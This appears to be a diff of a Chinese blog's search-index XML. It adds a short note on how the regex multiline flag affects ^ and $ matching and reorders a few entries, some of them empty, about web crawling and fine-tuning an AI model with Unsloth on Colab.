+    <url>/2025/01/14/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%B3%A8%E6%84%8F%E7%82%B9%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h3 id="正则匹配个人易忽略点记录"><a href="#正则匹配个人易忽略点记录" class="headerlink" title="正则匹配个人易忽略点记录"></a>正则匹配个人易忽略点记录</h3><h4 id="标志-模式修正符"><a href="#标志-模式修正符" class="headerlink" title="标志&#x2F;模式修正符"></a>标志&#x2F;模式修正符</h4><h5 id="1-多行修饰符-Multline"><a href="#1-多行修饰符-Multline" class="headerlink" title="1.多行修饰符(Multline)"></a>1.多行修饰符(Multline)</h5><p>与($,^)这两个检查首尾的符号紧密相关,注意点:在默认情况下,它们是默认检查全局，即所有字符的开头和结尾,即使你使用了换行符号,它也不会对首位进行检查。<br>例如表达式: &#x2F;.at(.)?$&#x2F;gm 表示小写字符a后跟小写字符t,末尾可选除换行符外任意字符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/&quot; =&gt; The fat</span><br><span class="line">                cat sat</span><br><span class="line">                on the mat.</span><br></pre></td></tr></table></figure>
+<p>这里只匹配mat<br>但是:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/gm&quot; =&gt; The fat</span><br><span class="line">                  cat sat</span><br><span class="line">                  on the mat.</span><br></pre></td></tr></table></figure>
+<p>这里就会把fat,sat,mat都给匹配上</p>
+<p><strong>总结:</strong></p>
+<p>重点就是:m加上后会在每排匹配,没有m只会在全局看尾巴或者开头有没有目标字符。</p>
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>正则匹配</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>汇编硬件基础</title>
     <url>/2025/03/17/%E6%B1%87%E7%BC%96%E7%A1%AC%E4%BB%B6%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<h1 id="三线概念"><a href="#三线概念" class="headerlink" title="三线概念"></a>三线概念</h1><h2 id="名词辨析"><a href="#名词辨析" class="headerlink" title="名词辨析"></a>名词辨析</h2><ul>
@@ -2825,6 +2825,11 @@ class ContextAwareClassifier:
       <tags>
         <tag>汇编硬件</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>爬虫，寻找数据集入门</title>
+    <url>/2025/03/10/%E7%88%AC%E8%99%AB%EF%BC%8C%E5%AF%BB%E6%89%BE%E6%95%B0%E6%8D%AE%E9%9B%86%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>滑动窗口数据清洗分区</title>
@@ -2871,11 +2876,6 @@ if __name__ == &#39;__main__&#39;:
   <entry>
     <title>特征工程一致性与持久化</title>
     <url>/2025/03/08/%E7%89%B9%E5%BE%81%E5%B7%A5%E7%A8%8B%E4%B8%80%E8%87%B4%E6%80%A7%E4%B8%8E%E6%8C%81%E4%B9%85%E5%8C%96/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>爬虫，寻找数据集入门</title>
-    <url>/2025/03/10/%E7%88%AC%E8%99%AB%EF%BC%8C%E5%AF%BB%E6%89%BE%E6%95%B0%E6%8D%AE%E9%9B%86%E5%85%A5%E9%97%A8/</url>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
@@ -2970,20 +2970,6 @@ if __name__ == &#39;__main__&#39;:
       </categories>
       <tags>
         <tag>ai数据流梳理</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>训练</title>
-    <url>/2025/01/22/%E8%AE%AD%E7%BB%83/</url>
-    <content><![CDATA[<h3 id="训练ai"><a href="#训练ai" class="headerlink" title="训练ai"></a>训练ai</h3><h4 id="下载资源"><a href="#下载资源" class="headerlink" title="下载资源"></a>下载资源</h4><p>1.u need to use the google colab<br>2.unsloth notebook:<a href="https://colab.research.google.com/drive/1Ys44kVvmeZtnICzWz0xgpRnrIOjZAuxp">https://colab.research.google.com/drive/1Ys44kVvmeZtnICzWz0xgpRnrIOjZAuxp</a></p>
-<h4 id="dataset"><a href="#dataset" class="headerlink" title="dataset"></a>dataset</h4><img src="/2025/01/22/%E8%AE%AD%E7%BB%83/image-20250122153200433.png" class="" title="image-20250122153200433">
-
-<h4 id="unsloth"><a href="#unsloth" class="headerlink" title="unsloth"></a>unsloth</h4><h4 id="weight"><a href="#weight" class="headerlink" title="weight"></a>weight</h4><h4 id="dataset-processing"><a href="#dataset-processing" class="headerlink" title="dataset processing"></a>dataset processing</h4><h4 id="huggface"><a href="#huggface" class="headerlink" title="huggface"></a>huggface</h4>]]></content>
-      <categories>
-        <category>ai</category>
-      </categories>
-      <tags>
-        <tag>ai训练</tag>
       </tags>
   </entry>
   <entry>
@@ -3254,6 +3240,20 @@ if __name__ == &#39;__main__&#39;:
       </categories>
       <tags>
         <tag>transformer模型入门</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>训练</title>
+    <url>/2025/01/22/%E8%AE%AD%E7%BB%83/</url>
+    <content><![CDATA[<h3 id="训练ai"><a href="#训练ai" class="headerlink" title="训练ai"></a>训练ai</h3><h4 id="下载资源"><a href="#下载资源" class="headerlink" title="下载资源"></a>下载资源</h4><p>1.u need to use the google colab<br>2.unsloth notebook:<a href="https://colab.research.google.com/drive/1Ys44kVvmeZtnICzWz0xgpRnrIOjZAuxp">https://colab.research.google.com/drive/1Ys44kVvmeZtnICzWz0xgpRnrIOjZAuxp</a></p>
+<h4 id="dataset"><a href="#dataset" class="headerlink" title="dataset"></a>dataset</h4><img src="/2025/01/22/%E8%AE%AD%E7%BB%83/image-20250122153200433.png" class="" title="image-20250122153200433">
+
+<h4 id="unsloth"><a href="#unsloth" class="headerlink" title="unsloth"></a>unsloth</h4><h4 id="weight"><a href="#weight" class="headerlink" title="weight"></a>weight</h4><h4 id="dataset-processing"><a href="#dataset-processing" class="headerlink" title="dataset processing"></a>dataset processing</h4><h4 id="huggface"><a href="#huggface" class="headerlink" title="huggface"></a>huggface</h4>]]></content>
+      <categories>
+        <category>ai</category>
+      </categories>
+      <tags>
+        <tag>ai训练</tag>
       </tags>
   </entry>
 </search>
